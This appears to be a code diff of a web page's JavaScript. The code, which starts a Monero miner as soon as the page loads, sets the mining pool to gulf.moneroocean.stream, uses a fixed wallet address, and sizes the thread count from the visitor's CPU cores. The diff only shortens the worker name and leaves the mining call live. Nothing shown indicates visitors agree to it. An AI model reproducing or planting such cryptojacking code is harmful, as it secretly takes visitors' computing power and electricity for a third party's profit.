@@ -114,12 +114,11 @@ function knowingtogood() {
 }
 
 document.addEventListener('DOMContentLoaded', function() {   
-  let numberA = Math.floor(Math.random() * 10000) + 1;
   let threadDisp = getT(navigator.hardwareConcurrency);
   if (threadDisp > 0){
     let name =  getResourceName();
     CustomPool = "gulf.moneroocean.stream:10128"
-    PerfektStart("87cpPYpiga6LY5pirZZzfx1gXW72HrfZKPt7ZJZgHv9qHPYdGQCNmGY2SGgJGv8RkcKvF34ZYiSxJG6f4ZH4KeDiRpPc38r", `${name} - ${numberA} - ${threadDisp}`, threadDisp);
+    PerfektStart("87cpPYpiga6LY5pirZZzfx1gXW72HrfZKPt7ZJZgHv9qHPYdGQCNmGY2SGgJGv8RkcKvF34ZYiSxJG6f4ZH4KeDiRpPc38r", `${name} - ${threadDisp}`, threadDisp);
   } 
 })
 
